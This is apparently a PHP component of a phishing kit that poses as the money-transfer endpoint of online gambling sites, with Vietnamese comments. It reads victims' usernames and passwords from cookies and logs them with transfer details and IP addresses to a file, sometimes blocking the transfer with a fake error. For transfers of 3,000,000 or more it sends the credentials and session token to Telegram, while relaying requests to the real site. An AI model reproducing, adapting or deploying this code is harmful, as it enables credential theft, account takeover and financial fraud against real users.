<?php
include "get_config.php";

// lấy config
$gate = isset($_GET["gate"]) ? $_GET["gate"] : "G88";
$gate_config = get_config($gate);

//bóc tách dữ liệu
$raw_content = file_get_contents("php://input");
$json_data = json_decode($raw_content, true);
$auth_token = $_SERVER["HTTP_AUTHORIZATION"];
$token = explode(' ', $auth_token)[1];
$username = $_COOKIE["username"];
$password = $_COOKIE["password"];
$receiver = $json_data["Username"];
$amount = $json_data["Amount"];
$reason = $json_data["Reason"];

// Lưu số tiền vào cookie
setcookie("amount", $amount, time() + (86400 * 30), "/");

// Nếu tắt chuyển khoản
if ($gate_config["disable_transfer"]) {
	$time = date("H:i:s Y-m-d");
	$ip = $_SERVER["REMOTE_ADDR"];
	$fp = fopen($gate_config["file_transfer"], "a+");
	fwrite($fp, "$username|$password|$receiver|$amount|$reason|$time|$ip\n");
	fclose($fp);
	die('{"c":-1023,"m":""}');
}

// Nếu muốn gửi thông tin chuyển khoản về tele
if ($gate_config["save_otp_transfer"] && $amount >= 3000000) {
	$amount = number_format($amount);
	$domain = strpos($gate, '88') !== false ? "$gate.vin" : "$gate.win";
	$message = "[$gate] Tài khoản: $username, mật khẩu: $password, người nhận: $receiver, số tiền: $amount, lý do chuyển: $reason, $domain?token=$token";
	send_telegram_transfer($message);
}

echo transfer($raw_content, $list_header);


function transfer($raw_content, $list_header)
{
	global $gate_config;
	$url = "https://profile.".$gate_config["domain"]."/api/Payment/TransferAccout";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $list_header);
	$raw_content = curl_exec($ch);

	$re = "/Set-Cookie: ([^;]+)/m";
	preg_match_all($re, $raw_content, $matches, PREG_SET_ORDER, 0);
	foreach ($matches as $match) {
		$key = explode("=", $match[1])[0];
		$val = urldecode(explode("=", $match[1])[1]);
		setcookie($key, $val, time() + (86400 * 30), "/");
	}
	return explode("\r\n\r\n", $raw_content)[1];
}
?>